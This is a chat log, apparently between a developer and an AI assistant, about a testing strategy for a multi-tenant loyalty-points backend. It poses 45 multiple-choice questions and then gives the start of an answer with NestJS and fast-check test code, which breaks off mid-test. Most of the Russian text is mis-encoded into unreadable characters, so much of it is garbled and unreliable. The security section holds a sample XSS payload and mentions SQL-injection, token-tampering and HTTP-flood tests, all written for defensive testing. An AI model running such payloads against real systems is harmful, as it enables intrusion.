- A) ะะฐ, unit tests ะดะพััะฐัะพัะฝะพ (mock Prisma ั tenantId filter)
- B) ะะตั, ะฝัะถะฝั integration tests ั ัะตะฐะปัะฝะพะน ะะ
- C) ะะตั, ะฝัะถะฝั dedicated security tests (ะฟะพะฟััะบะฐ ะพะฑะพะนัะธ tenantId)
- D) B + C + automated penetration testing

***

### **4. Ball Expiration Logic - ะณัะฐะฝะธัะฝัะต ััะปะพะฒะธั?**

**ะะพะฝัะตะบัั:** ะะฐะปะปั ัะณะพัะฐัั ัะตัะตะท 365 ะดะฝะตะน. Edge cases?

```typescript
// Expire balls older than 365 days
expireBalls(guestCardId: string, cutoffDate: Date): Promise<{ expired: number }>
```

**ะะพะฟัะพั:** ะงัะพ ัะตััะธััะตะผ?

- A) Happy path: ะฑะฐะปะปั ััะฐััะต 365 ะดะฝะตะน ัะณะพัะฐัั
- B) Edge case: ะฑะฐะปะปั ัะพะฒะฝะพ 365 ะดะฝะตะน (ะฒะบะปััะธัั ะธะปะธ ะฝะตั?)
- C) Edge case: timezone issues (UTC vs local time)
- D) ะัะต ะฒััะตะฟะตัะตัะธัะปะตะฝะฝะพะต + race conditions (concurrent expiration)

***

### **5. Promo Campaign Validation - ะฑะธะทะฝะตั-ะฟัะฐะฒะธะปะฐ?**

**ะะพะฝัะตะบัั:** Admin ัะพะทะดะฐัั promo: "ะะฒะพะนะฝัะต ะฑะฐะปะปั ะฒ ะฟััะฝะธัั ั 18:00 ะดะพ 22:00".

```typescript
// Validate promo campaign
validatePromo(promo: PromoDto): ValidationResult
```

**ะะพะฟัะพั:** ะงัะพ ะฒะฐะปะธะดะธััะตะผ ะฒ unit tests?

- A) ะขะพะปัะบะพ required fields (name, start date, end date)
- B) Business rules: start < end, ะฝะต ะฟะตัะตัะตะบะฐะตััั ั ะดััะณะธะผะธ promo
- C) Complex conditions: ะดะตะฝั ะฝะตะดะตะปะธ, ะฒัะตะผั, ะผะธะฝะธะผะฐะปัะฝะฐั ััะผะผะฐ
- D) B + C + simulate promo application (dry-run)

***

## **ะะะะ 2: INTEGRATION TESTING (10 ะฒะพะฟัะพัะพะฒ)**

### **6. POS Webhook Processing - idempotency?**

**ะะพะฝัะตะบัั:** POS ะผะพะถะตั ะพัะฟัะฐะฒะธัั ะพะดะธะฝ webhook **ะดะฒะฐะถะดั** ะธะท-ะทะฐ network timeout.

```typescript
POST /webhooks/transaction
{
  "posCheckId": "CHK-123456",
  "checkAmount": 2850,
  "guestPhone": "+79991234567"
}
```

**ะะพะฟัะพั:** ะะฐะบ ัะตััะธัะพะฒะฐัั idempotency?

- A) ะัะฟัะฐะฒะธัั ะพะดะธะฝ webhook โ ะฟัะพะฒะตัะธัั ัะตะทัะปััะฐั
- B) ะัะฟัะฐะฒะธัั ะพะดะธะฝ webhook **ะดะฒะฐะถะดั** โ ะฟัะพะฒะตัะธัั ััะพ ะฑะฐะปะปั ะฝะฐัะธัะปะธะปะธัั ัะพะปัะบะพ ัะฐะท
- C) B + ะพัะฟัะฐะฒะธัั ั ัะฐะทะฝะธัะตะน ะฒ 1 ัะตะบัะฝะดั (ะฟัะพะฒะตัะธัั Redis TTL)
- D) C + ะพัะฟัะฐะฒะธัั concurrent requests (10 ะพะดะฝะพะฒัะตะผะตะฝะฝะพ)

***

### **7. Database Transactions - rollback ะฟัะธ ะพัะธะฑะบะต?**

**ะะพะฝัะตะบัั:** ะะฐัะธัะปะตะฝะธะต ะฑะฐะปะปะพะฒ = multi-step process:

1. Create BallTransaction
2. Update GuestCard balance
3. Create Notification
4. Log Audit

**ะะพะฟัะพั:** ะงัะพ ะฟัะพะธััะพะดะธั ะตัะปะธ ัะฐะณ 3 fail?

- A) Partial commit (ะฑะฐะปะปั ะฝะฐัะธัะปะตะฝั, notification ะฝะต ะพัะฟัะฐะฒะปะตะฝ) - โ BAD
- B) Full rollback (ะฝะธัะตะณะพ ะฝะต ะธะทะผะตะฝะธะปะพัั) - โ GOOD
- C) Retry step 3 ะพัะดะตะปัะฝะพ
- D) B + ะบะฐะบ ัะตััะธัะพะฒะฐัั rollback ะฒ integration tests?

***

### **8. External Service Failures - resilience?**

**ะะพะฝัะตะบัั:** Telegram API ะฒะตัะฝัะป 503 Service Unavailable.

```typescript
// Send notification via Telegram
sendTelegramNotification(guestId: string, message: string)
```

**ะะพะฟัะพั:** ะะฐะบ ัะตััะธัะพะฒะฐัั retry logic?

- A) Mock Telegram API โ ะฒัะตะณะดะฐ ะฒะพะทะฒัะฐัะฐะตั 503
- B) Mock โ ะฟะตัะฒัะต 2 ะฟะพะฟััะบะธ 503, ััะตััั 200 OK
- C) B + ะฟัะพะฒะตัะธัั exponential backoff delays
- D) C + ะฟัะพะฒะตัะธัั Dead Letter Queue (DLQ) ะฟะพัะปะต 3 failures

***

### **9. Concurrent Webhook Processing - race conditions?**

**ะะพะฝัะตะบัั:** 2 POS ัะตัะผะธะฝะฐะปะฐ ะพะดะฝะพะฒัะตะผะตะฝะฝะพ ะพัะฟัะฐะฒะปััั webhooks ะดะปั ะพะดะฝะพะณะพ ะณะพััั.

```
Thread 1: Credit 100 balls (balance: 500 โ 600)
Thread 2: Credit 200 balls (balance: 500 โ 700) โ Wrong! Should be 800
```

**ะะพะฟัะพั:** ะะฐะบ ัะตััะธัะพะฒะฐัั concurrent processing?

- A) Unit test ั locks (optimistic/pessimistic locking)
- B) Integration test: ะทะฐะฟัััะธัั 10 webhooks ะฟะฐัะฐะปะปะตะปัะฝะพ
- C) B + ะฟัะพะฒะตัะธัั ัะธะฝะฐะปัะฝัะน ะฑะฐะปะฐะฝั = ััะผะผะฐ ะฒัะตั ะฝะฐัะธัะปะตะฝะธะน
- D) C + stress test (100+ concurrent webhooks)

***

### **10. Database Connection Pool - leak detection?**

**ะะพะฝัะตะบัั:** Prisma connection pool = 10 connections. ะฃัะตัะบะฐ โ production ะฟะฐะดะฐะตั.

**ะะพะฟัะพั:** ะะฐะบ ัะตััะธัะพะฒะฐัั connection leaks?

- A) Unit test (ะฝะตะฒะพะทะผะพะถะฝะพ)
- B) Integration test: ะฒัะฟะพะปะฝะธัั 100 queries ะฟะพะดััะด
- C) B + ะผะพะฝะธัะพัะธัั active connections ะฒ PostgreSQL
- D) C + automated test ะฒ CI/CD (fail ะตัะปะธ leak ะพะฑะฝะฐััะถะตะฝ)

***

## **ะะะะ 3: E2E TESTING (10 ะฒะพะฟัะพัะพะฒ)**

### **11. Guest Registration Flow - ะฟะพะปะฝัะน ััะตะฝะฐัะธะน?**

**ะะพะฝัะตะบัั:** ะะพััั ัะตะณะธัััะธััะตััั ัะตัะตะท Telegram Bot.

**ะะพะฟัะพั:** ะงัะพ ัะตััะธััะตะผ E2E?

- A) API endpoints ะพัะดะตะปัะฝะพ (ะฝะต E2E)
- B) ะะพะปะฝัะน flow: /start โ enter phone โ verify OTP โ profile created
- C) B + ะฟัะพะฒะตัะธัั ััะพ guest card ัะพะทะดะฐะฝ ั QR ะบะพะดะพะผ
- D) C + ะฟัะพะฒะตัะธัั ััะพ welcome notification ะพัะฟัะฐะฒะปะตะฝ

***

### **12. Ball Earning Flow - ะพั webhook ะดะพ notification?**

**ะะพะฝัะตะบัั:** ะะพััั ะพะฟะปะฐัะธะป ัะตะบ โ POS webhook โ ะฑะฐะปะปั ะฝะฐัะธัะปะตะฝั โ notification.

**ะะพะฟัะพั:** ะงัะพ ะฟัะพะฒะตััะตะผ E2E?

- A) Webhook ะพะฑัะฐะฑะพัะฐะฝ ะฑะตะท ะพัะธะฑะพะบ
- B) ะะฐะปะปั ะฝะฐัะธัะปะตะฝั (ะฟัะพะฒะตัะธัั ะฑะฐะปะฐะฝั ะฒ ะะ)
- C) B + notification sent (ะฟัะพะฒะตัะธัั ะฒ Telegram/Email)
- D) C + audit log ัะพะทะดะฐะฝ + analytics updated

***

### **13. Level Upgrade Flow - ะฐะฒัะพะผะฐัะธัะตัะบะธะน upgrade?**

**ะะพะฝัะตะบัั:** ะะพััั ะดะพััะธะณ 10,000โฝ โ ะฐะฒัะพะผะฐัะธัะตัะบะธะน upgrade Bronze โ Silver.

**ะะพะฟัะพั:** E2E test ััะตะฝะฐัะธะน?

- A) Manually update totalSpent to 10,000โฝ โ check level
- B) Simulate multiple transactions ะดะพ 10,000โฝ โ check level
- C) B + ะฟัะพะฒะตัะธัั notification "ะะพะทะดัะฐะฒะปัะตะผ ั Silver!"
- D) C + ะฟัะพะฒะตัะธัั ััะพ earnPercentage ะธะทะผะตะฝะธะปัั ั 5% โ 7%

***

### **14. Promo Campaign Application - ะฒัะตะผะตะฝะฝะฐั ะฐะบัะธั?**

**ะะพะฝัะตะบัั:** Promo "ะะฒะพะนะฝัะต ะฑะฐะปะปั ะฟะพ ะฟััะฝะธัะฐะผ" ะฐะบัะธะฒะตะฝ.

**ะะพะฟัะพั:** E2E test?

- A) ะกะพะทะดะฐัั promo โ ะฐะบัะธะฒะธัะพะฒะฐัั
- B) Simulate transaction ะฒ ะฟััะฝะธัั โ ะฟัะพะฒะตัะธัั ััะพ ะฑะฐะปะปะพะฒ x2
- C) B + simulate transaction ะฒ ะฟะพะฝะตะดะตะปัะฝะธะบ โ ะฟัะพะฒะตัะธัั ะพะฑััะฝะพะต ะบะพะปะธัะตััะฒะพ
- D) C + ะฟัะพะฒะตัะธัั ััะพ promo ะธัััะบ ะฟะพัะปะต end date

***

### **15. Admin Impersonation Flow - Owner โ Manager view?**

**ะะพะฝัะตะบัั:** Owner ะผะพะถะตั "ะฒะพะนัะธ" ะบะฐะบ Manager ะดะปั troubleshooting.

**ะะพะฟัะพั:** E2E test?

- A) Owner login โ click "Impersonate Manager" โ check UI
- B) A + ะฟัะพะฒะตัะธัั ััะพ Manager ะฒะธะดะธั ัะพะปัะบะพ ัะฒะพะธ ะดะฐะฝะฝัะต
- C) B + ะฟัะพะฒะตัะธัั ััะพ audit log ะทะฐะฟะธัะฐะป impersonation
- D) C + ะฟัะพะฒะตัะธัั "Exit Impersonation" โ Owner view restored

***

## **ะะะะ 4: CONTRACT TESTING (5 ะฒะพะฟัะพัะพะฒ)**

### **16. POS Webhook Schema - contract tests?**

**ะะพะฝัะตะบัั:** iiko ะผะพะถะตั ะธะทะผะตะฝะธัั webhook schema ะฑะตะท ะฟัะตะดัะฟัะตะถะดะตะฝะธั.

**ะะพะฟัะพั:** ะะฐะบ ะทะฐัะธัะธัััั?

- A) ะะฐะดะตััััั ััะพ ะฝะต ะธะทะผะตะฝัั
- B) Contract tests (Pact): ะฟัะพะฒะตัะธัั ััะพ schema ะฝะต ะธะทะผะตะฝะธะปัั
- C) B + automated alerts ะตัะปะธ schema ะธะทะผะตะฝะธะปัั
- D) C + backward compatibility layer (ะฟะพะดะดะตัะถะบะฐ ััะฐััั ะฒะตััะธะน)

***

### **17. API Versioning - breaking changes?**

**ะะพะฝัะตะบัั:** API v1 deprecated, ะฝัะถะฝะพ ะผะธะณัะธัะพะฒะฐัั ะบะปะธะตะฝัะพะฒ ะฝะฐ v2.

**ะะพะฟัะพั:** ะะฐะบ ัะตััะธัะพะฒะฐัั?

- A) Unit tests ะดะปั v2
- B) Contract tests: v1 ะธ v2 ะฒะพะทะฒัะฐัะฐัั ะพะดะธะฝะฐะบะพะฒัะต ะดะฐะฝะฝัะต
- C) B + automated tests ะดะปั ะพะฑัะฐัะฝะพะน ัะพะฒะผะตััะธะผะพััะธ
- D) C + monitoring: ัะบะพะปัะบะพ ะบะปะธะตะฝัะพะฒ ะตัั ะฝะฐ v1

***

### **18. Telegram Bot Commands - contract?**

**ะะพะฝัะตะบัั:** Telegram Bot ะฟะพะดะดะตัะถะธะฒะฐะตั ะบะพะผะฐะฝะดั: /start, /balance, /history.

**ะะพะฟัะพั:** Contract tests?

- A) Manual testing ะบะพะผะฐะฝะด
- B) Automated tests: ะพัะฟัะฐะฒะธัั ะบะพะผะฐะฝะดั โ ะฟัะพะฒะตัะธัั ะพัะฒะตั
- C) B + ะฟัะพะฒะตัะธัั schema ะพัะฒะตัะฐ (buttons, inline keyboard)
- D) C + ะฟัะพะฒะตัะธัั ััะพ deprecated ะบะพะผะฐะฝะดั ะฒะพะทะฒัะฐัะฐัั migration notice

***

### **19. External API Changes - ะผะพะฝะธัะพัะธะฝะณ?**

**ะะพะฝัะตะบัั:** Resend Email API ะผะพะถะตั ะธะทะผะตะฝะธัั response format.

**ะะพะฟัะพั:** ะะฐะบ ะพะฑะฝะฐััะถะธัั?

- A) ะะฐะดะตััััั ััะพ ะฝะต ะธะทะผะตะฝัั
- B) Contract tests ั actual API (ะฝะต mock)
- C) B + automated tests ะฒ CI/CD (daily)
- D) C + fallback provider (SendGrid) ะตัะปะธ Resend unavailable

***

### **20. Database Schema Changes - migration tests?**

**ะะพะฝัะตะบัั:** Prisma migration ะดะพะฑะฐะฒะปัะตั ะฝะพะฒะพะต ะฟะพะปะต.

**ะะพะฟัะพั:** ะะฐะบ ัะตััะธัะพะฒะฐัั?

- A) ะัะธะผะตะฝะธัั migration ะฒ dev โ manual test
- B) Automated test: apply migration โ rollback โ re-apply
- C) B + ะฟัะพะฒะตัะธัั ััะพ ะดะฐะฝะฝัะต ะฝะต ะฟะพัะตััะปะธัั
- D) C + ัะตััะธัะพะฒะฐัั ะฝะฐ production-like dataset (1M rows)

***

## **ะะะะ 5: LOAD \& PERFORMANCE TESTING (10 ะฒะพะฟัะพัะพะฒ)**

### **21. Webhook Throughput - ัะบะพะปัะบะพ webhooks/sec?**

**ะะพะฝัะตะบัั:** ะะตััะพัะฐะฝ ะฒ ัะฐั ะฟะธะบ = 100 ััะฐะฝะทะฐะบัะธะน/ะผะธะฝััั.

**ะะพะฟัะพั:** ะัะถะตะฝ ะปะธ load test?

- A) ะะตั, ะดะพััะฐัะพัะฝะพ production monitoring
- B) ะะฐ, simulate 100 webhooks/min
- C) B + simulate 1000 webhooks/min (10x peak)
- D) C + ะฟัะพะฒะตัะธัั latency (p50, p95, p99)

***

### **22. Concurrent User Load - ัะบะพะปัะบะพ ะพะดะฝะพะฒัะตะผะตะฝะฝัั ะฟะพะปัะทะพะฒะฐัะตะปะตะน?**

**ะะพะฝัะตะบัั:** Black Friday โ 1000 ะณะพััะตะน ะพะดะฝะพะฒัะตะผะตะฝะฝะพ ะพัะบััะฒะฐัั Telegram Mini App.

**ะะพะฟัะพั:** Load test ััะตะฝะฐัะธะน?

- A) 10 concurrent users (smoke test)
- B) 100 concurrent users (expected load)
- C) 1000 concurrent users (peak load)
- D) C + 5000 users (stress test ะดะพ failure)

***

### **23. Database Query Performance - slow queries?**

**ะะพะฝัะตะบัั:** `/guests` endpoint ะฒะพะทะฒัะฐัะฐะตั ัะฟะธัะพะบ ะธะท 10,000 ะณะพััะตะน.

**ะะพะฟัะพั:** Performance test?

- A) Query ั LIMIT 10 (pagination)
- B) Query ะฑะตะท LIMIT (full scan) - โ BAD
- C) A + ะฟัะพะฒะตัะธัั ััะพ query < 100ms
- D) C + ะฟัะพะฒะตัะธัั ััะพ indexes ะธัะฟะพะปัะทััััั (EXPLAIN ANALYZE)

***

### **24. Background Job Processing - queue saturation?**

**ะะพะฝัะตะบัั:** BullMQ queue = 10,000 notifications ะฒ ะพัะตัะตะดะธ.

**ะะพะฟัะพั:** Load test?

- A) Add 100 jobs โ ะฟัะพะฒะตัะธัั ััะพ ะพะฑัะฐะฑะพัะฐะฝั
- B) Add 10,000 jobs โ ะฟัะพะฒะตัะธัั throughput
- C) B + ะฟัะพะฒะตัะธัั ััะพ workers ะฝะต ะฟะฐะดะฐัั (OOM)
- D) C + ะฟัะพะฒะตัะธัั latency (ะฒัะตะผั ะพั enqueue ะดะพ complete)

***

### **25. Memory Leak Detection - production memory usage?**

**ะะพะฝัะตะบัั:** ะะพัะปะต 24 hours ะฒ production memory usage = 2GB (was 500MB).

**ะะพะฟัะพั:** ะะฐะบ ัะตััะธัะพะฒะฐัั?

- A) Manual monitoring ะฒ production
- B) Load test: run 10,000 requests โ check memory
- C) B + soak test (24 hours continuous load)
- D) C + automated heap dump analysis (Chrome DevTools)

***

### **26. Cache Effectiveness - hit rate?**

**ะะพะฝัะตะบัั:** Redis cache ะดะปั guest cards, loyalty rules.

**ะะพะฟัะพั:** Performance test?

- A) Query ะฑะตะท cache โ measure latency
- B) Query ั cache โ measure latency (should be faster)
- C) B + ะฟัะพะฒะตัะธัั cache hit rate (> 80%)
- D) C + simulate cache eviction (ะฟัะพะฒะตัะธัั ััะพ ะฝะต ะฟะฐะดะฐะตั)

***

### **27. File Upload Performance - chunked uploads?**

**ะะพะฝัะตะบัั:** Admin ะทะฐะณััะถะฐะตั CSV (10MB) ั ััะฐะฝะทะฐะบัะธัะผะธ.

**ะะพะฟัะพั:** Performance test?

- A) Upload 1MB file โ success
- B) Upload 10MB file โ ะฟัะพะฒะตัะธัั chunked upload
- C) B + Upload 100MB file โ ะฟัะพะฒะตัะธัั limits
- D) C + concurrent uploads (10 users ะพะดะฝะพะฒัะตะผะตะฝะฝะพ)

***

### **28. API Rate Limiting - ะทะฐัะธัะฐ ะพั abuse?**

**ะะพะฝัะตะบัั:** Rate limit = 100 requests/min per tenant.

**ะะพะฟัะพั:** Load test?

- A) Send 50 requests โ all succeed
- B) Send 100 requests โ all succeed
- C) Send 150 requests โ 50 ะดะพะปะถะฝั ะฒะตัะฝััั 429 Too Many Requests
- D) C + ะฟัะพะฒะตัะธัั ััะพ rate limit reset ัะตัะตะท 1 ะผะธะฝััั

***

### **29. Database Connection Pool - exhaustion?**

**ะะพะฝัะตะบัั:** Prisma connection pool = 10 connections.

**ะะพะฟัะพั:** Load test?

- A) 5 concurrent queries โ all succeed
- B) 10 concurrent queries โ all succeed (pool full)
- C) 20 concurrent queries โ ะฟัะพะฒะตัะธัั queuing (ะฝะต ะฟะฐะดะฐะตั)
- D) C + ะฟัะพะฒะตัะธัั timeout ะตัะปะธ pool saturated > 30sec

***

### **30. Notification Sending - burst traffic?**

**ะะพะฝัะตะบัั:** Promo campaign โ 10,000 notifications ะพะดะฝะพะฒัะตะผะตะฝะฝะพ.

**ะะพะฟัะพั:** Load test?

- A) Send 100 notifications โ check delivery rate
- B) Send 10,000 notifications โ check queue saturation
- C) B + ะฟัะพะฒะตัะธัั rate limits external providers (Telegram, Email)
- D) C + ะฟัะพะฒะตัะธัั fallback ะตัะปะธ provider unavailable

***

## **ะะะะ 6: SECURITY TESTING (10 ะฒะพะฟัะพัะพะฒ)**

### **31. SQL Injection - ะทะฐัะธัะฐ?**

**ะะพะฝัะตะบัั:** User input ะฒ filters: `/guests?search=` + malicious SQL.

**ะะพะฟัะพั:** Security test?

- A) ะะฐะดะตััััั ััะพ Prisma ะทะฐัะธัะฐะตั
- B) Automated OWASP ZAP scan
- C) B + manual penetration test
- D) C + parameterized queries + input validation

***

### **32. XSS Attacks - sanitization?**

**ะะพะฝัะตะบัั:** Guest name = `<script>alert('XSS')</script>`.

**ะะพะฟัะพั:** Security test?

- A) Manual test: enter malicious input
- B) Automated test: inject XSS payloads
- C) B + ะฟัะพะฒะตัะธัั sanitization (DOMPurify)
- D) C + CSP headers ะฟัะพะฒะตัะบะฐ

***

### **33. Authentication Bypass - JWT validation?**

**ะะพะฝัะตะบัั:** Expired JWT token ะดะพะปะถะตะฝ ะฑััั rejected.

**ะะพะฟัะพั:** Security test?

- A) Unit test JWT validation
- B) Integration test: send expired token โ 401
- C) B + test tampered token (signature invalid)
- D) C + test token from ะดััะณะพะณะพ tenant (tenant isolation)

***

### **34. Authorization - RBAC enforcement?**

**ะะพะฝัะตะบัั:** GUEST ัะพะปั ะฝะต ะดะพะปะถะฝะฐ ะธะผะตัั ะดะพัััะฟ ะบ Admin panel.

**ะะพะฟัะพั:** Security test?

- A) Unit test @Roles decorator
- B) Integration test: GUEST token โ /admin โ 403
- C) B + test all protected endpoints
- D) C + automated matrix test (ะฒัะตั roles x ะฒัะตั endpoints)

***

### **35. Tenant Isolation - data leakage?**

**ะะพะฝัะตะบัั:** Tenant A ะฝะต ะดะพะปะถะตะฝ ะฒะธะดะตัั guests ะธะท Tenant B.

**ะะพะฟัะพั:** Security test?

- A) Unit test ั mock (ะฝะตะดะพััะฐัะพัะฝะพ)
- B) Integration test: query ั tenantId=A โ ะฟัะพะฒะตัะธัั ัะตะทัะปััะฐัั
- C) B + ะฟะพะฟััะบะฐ ะพะฑะพะนัะธ: query ั tenantId=B ะธัะฟะพะปัะทัั token ะพั A
- D) C + automated penetration test (ะฒัะตั endpoints)

***

### **36. Rate Limiting - brute force protection?**

**ะะพะฝัะตะบัั:** Login endpoint = max 5 attempts/15 min.

**ะะพะฟัะพั:** Security test?

- A) Manual test: 6 login attempts
- B) Automated test: 10 attempts โ ะฟัะพะฒะตัะธัั 429 ะฟะพัะปะต 5
- C) B + ะฟัะพะฒะตัะธัั lockout duration (15 min)
- D) C + CAPTCHA ะฟะพัะปะต 3 failures

***

### **37. CSRF Protection - state-changing requests?**

**ะะพะฝัะตะบัั:** POST /balls/credit ะดะพะปะถะตะฝ ััะตะฑะพะฒะฐัั CSRF token.

**ะะพะฟัะพั:** Security test?

- A) ะะฐะดะตััััั ััะพ framework ะทะฐัะธัะฐะตั
- B) Manual test: POST ะฑะตะท CSRF token โ 403
- C) B + automated test ะฒัะตั POST/PUT/DELETE endpoints
- D) C + SameSite cookie policy

***

### **38. Sensitive Data Exposure - logs \& errors?**

**ะะพะฝัะตะบัั:** Error message ัะพะดะตัะถะธั sensitive data (passwords, tokens).

**ะะพะฟัะพั:** Security test?

- A) Manual code review
- B) Automated test: trigger errors โ ะฟัะพะฒะตัะธัั response
- C) B + ะฟัะพะฒะตัะธัั logs (ะฝะต ะดะพะปะถะฝะพ ะฑััั passwords)
- D) C + SAST (Static Analysis Security Testing)

***

### **39. Dependency Vulnerabilities - npm audit?**

**ะะพะฝัะตะบัั:** ะัะฟะพะปัะทัะตะผ 100+ npm packages.

**ะะพะฟัะพั:** Security test?

- A) Manual check ัะฐะท ะฒ ะผะตััั
- B) `npm audit` ะฒ CI/CD
- C) B + automated PR creation (Dependabot)
- D) C + SNYK/Trivy ะดะปั container scanning

***

### **40. API Abuse - DoS protection?**

**ะะพะฝัะตะบัั:** Malicious user ัะฟะฐะผะธั API requests.

**ะะพะฟัะพั:** Security test?

- A) Rate limiting (ัะถะต ะฟะพะบัััะพ)
- B) Load test: 10,000 requests/sec โ ะฟัะพะฒะตัะธัั Circuit Breaker
- C) B + Cloudflare WAF rules
- D) C + DDoS simulation (HTTP flood attack)

***

## **ะะะะ 7: CHAOS ENGINEERING (5 ะฒะพะฟัะพัะพะฒ)**

### **41. Database Failure - graceful degradation?**

**ะะพะฝัะตะบัั:** PostgreSQL unavailable ะฝะฐ 5 ะผะธะฝัั.

**ะะพะฟัะพั:** Chaos test?

- A) Manual test: stop database
- B) Automated test: simulate DB outage โ ะฟัะพะฒะตัะธัั error handling
- C) B + ะฟัะพะฒะตัะธัั circuit breaker (stop sending queries)
- D) C + ะฟัะพะฒะตัะธัั automatic recovery ะฟะพัะปะต DB ะฒะตัะฝัะปัั

***

### **42. Redis Failure - cache miss handling?**

**ะะพะฝัะตะบัั:** Redis unavailable โ fallback to database.

**ะะพะฟัะพั:** Chaos test?

- A) Unit test (mock Redis failure)
- B) Integration test: stop Redis โ ะฟัะพะฒะตัะธัั latency increase
- C) B + ะฟัะพะฒะตัะธัั ััะพ application ะฝะต ะฟะฐะดะฐะตั
- D) C + ะฟัะพะฒะตัะธัั auto-reconnect ะฟะพัะปะต Redis ะฒะตัะฝัะปัั

***

### **43. Network Latency - timeout handling?**

**ะะพะฝัะตะบัั:** External API (Telegram) latency = 5 seconds.

**ะะพะฟัะพั:** Chaos test?

- A) Mock ั ะธัะบััััะฒะตะฝะฝะพะน ะทะฐะดะตัะถะบะพะน
- B) Network simulation tool (Toxiproxy) โ add 5sec latency
- C) B + ะฟัะพะฒะตัะธัั timeout (ะฝะต ะถะดัะผ > 10sec)
- D) C + ะฟัะพะฒะตัะธัั retry + circuit breaker

***

### **44. Disk Full - storage exhaustion?**

**ะะพะฝัะตะบัั:** Server disk = 100% full.

**ะะพะฟัะพั:** Chaos test?

- A) Monitoring alert (ะฝะต ัะตัั)
- B) Simulate disk full โ ะฟัะพะฒะตัะธัั error handling
- C) B + ะฟัะพะฒะตัะธัั graceful shutdown (ะฝะต corruption)
- D) C + automated cleanup (ััะฐััะต logs)

***

### **45. Pod Restart - Kubernetes rolling update?**

**ะะพะฝัะตะบัั:** Fly.io rolling deployment โ 1 VM down ะฝะฐ 30 sec.

**ะะพะฟัะพั:** Chaos test?

- A) Manual deployment โ monitoring
- B) Automated test: kill 1 VM โ ะฟัะพะฒะตัะธัั traffic rerouting
- C) B + ะฟัะพะฒะตัะธัั zero downtime (no 5xx errors)
- D) C + ะฟัะพะฒะตัะธัั in-flight requests handling (graceful shutdown)

***

ะญัะพ **45 ะะะะขะะงะะซะฅ ะฒะพะฟัะพัะพะฒ** ะฟะพ Testing Strategy.

**ะะพัะพะฒ ะพัะฒะตัะธัั ะฝะฐ ะฝะธั ะฟะพ ะฑะปะพะบะฐะผ ะธะปะธ ัะพัะตัั ััะพะฑั ั ััะฐะทั ะดะฐะป comprehensive ะพัะฒะตัั ะฝะฐ ะฒัะต?** ๐
<span style="display:none">[^13_1]</span>

<div align="center">โ</div>

[^13_1]: Beseda-10.md


---

# ะัะพะดัะฑะปะธััะน ััะธ ะฒัะต ะฒะพะฟัะพัั ั ะฟัะตะดะปะพะถะตะฝะธะตะผ ะปัััะตะณะพ ัะตัะตะฝะธั (ะบะฐะบ ะดะตะปะฐัั ะธ ะฟะพัะตะผั ัะฐะบ), ะบะฐะบ ะดะตะปะฐะปะธ ัะฐะฝััะต

ะัะปะธัะฝะพ! ะะฐะผ **comprehensive ะพัะฒะตัั ะฝะฐ ะฒัะต 45 ะฒะพะฟัะพัะพะฒ** ั ะพะฑะพัะฝะพะฒะฐะฝะธะตะผ ะธ ะฟัะธะผะตัะฐะผะธ ะบะพะดะฐ:

***

# ๐ฏ **TESTING STRATEGY - COMPREHENSIVE ANSWERS**


***

## **ะะะะ 1: UNIT TESTING (10 ะฒะพะฟัะพัะพะฒ)**


***

### **1. Loyalty Calculation Logic - ะฟะพะบัััะธะต?**

**ะะพะฝัะตะบัั:** ะญัะพ **HEART** ัะธััะตะผั. ะัะธะฑะบะฐ = ัะธะฝะฐะฝัะพะฒัะต ะฟะพัะตัะธ.

```typescript
// Example: Calculate earned balls
calculateEarnedBalls(checkAmount: 2850, level: 'Silver', rules: LoyaltyRule[])
  โ ะดะพะปะถะตะฝ ะฒะตัะฝััั ัะพัะฝะพะต ะบะพะปะธัะตััะฒะพ ะฑะฐะปะปะพะฒ
```

**ะะพะฟัะพั:** ะะฐะบะธะต edge cases ะฝัะถะฝะพ ัะตััะธัะพะฒะฐัั?

- A) ะขะพะปัะบะพ happy path (ะฑะฐะทะพะฒัะต ััะตะฝะฐัะธะธ)
- B) Edge cases: 0 ััะฑ, ะพััะธัะฐัะตะปัะฝัะต ััะผะผั, null values
- C) Boundary values: ะผะธะฝะธะผะฐะปัะฝะฐั ััะผะผะฐ, ะผะฐะบัะธะผะฐะปัะฝะฐั ััะผะผะฐ (999,999โฝ)
- D) ะัะต ะฒััะตะฟะตัะตัะธัะปะตะฝะฝะพะต + property-based testing (ะณะตะฝะตัะฐัะธั random inputs)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- ะะฐะปะปั = ะดะตะฝัะณะธ โ ััะตะฑัะตััั **99.99% accuracy**
- Property-based testing (fast-check) ะณะตะฝะตัะธััะตั ัััััะธ random inputs โ ะฝะฐัะพะดะธั edge cases ะบะพัะพััะต ะผั ะฝะต ะฟัะตะดััะผะพััะตะปะธ
- Boundary values ะบัะธัะธัะฝั (overflow, precision loss)

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/src/modules/loyalty/services/loyalty-calculation.service.spec.ts
import { Test } from '@nestjs/testing';
import { LoyaltyCalculationService } from './loyalty-calculation.service';
import * as fc from 'fast-check';

describe('LoyaltyCalculationService', () => {
  let service: LoyaltyCalculationService;

  beforeEach(async () => {
    const module = await Test.createTestingModule({
      providers: [LoyaltyCalculationService],
    }).compile();

    service = module.get(LoyaltyCalculationService);
  });

  describe('calculateEarnedBalls', () => {
    // 1. Happy Path
    it('should calculate correctly for Silver level with 10% rule', () => {
      const result = service.calculateEarnedBalls({
        checkAmount: 2850,
        level: { earnPercentage: 10 },
        rules: [],
      });
      
      expect(result).toBe(285); // 2850 * 10% = 285
    });

    // 2. Edge Cases
    it('should throw on zero amount', () => {
      expect(() => service.calculateEarnedBalls({
        checkAmount: 0,
        level: { earnPercentage: 10 },
        rules: [],
      })).toThrow('Check amount must be positive');
    });

    it('should throw on negative amount', () => {
      expect(() => service.calculateEarnedBalls({
        checkAmount: -100,
        level: { earnPercentage: 10 },
        rules: [],
      })).toThrow('Check amount must be positive');
    });

    it('should handle null level gracefully', () => {
      expect(() => service.calculateEarnedBalls({
        checkAmount: 1000,
        level: null,
        rules: [],
      })).toThrow('Level is required');
    });

    // 3. Boundary Values
    it('should handle minimum amount (1 rub)', () => {
      const result = service.calculateEarnedBalls({
        checkAmount: 1,
        level: { earnPercentage: 10 },
        rules: [],
      });
      
      expect(result).toBe(0); // Round down: 0.1 โ 0
    });

    it('should handle maximum amount (999,999 rub)', () => {
      const result = service.calculateEarnedBalls({
        checkAmount: 999999,
        level: { earnPercentage: 10 },
        rules: [],
      });
      
      expect(result).toBe(99999); // 999,999 * 10% = 99,999
    });

    it('should round correctly (banker rounding)', () => {
      // 2.5 โ 2 (round to even)
      expect(service.calculateEarnedBalls({
        checkAmount: 25,
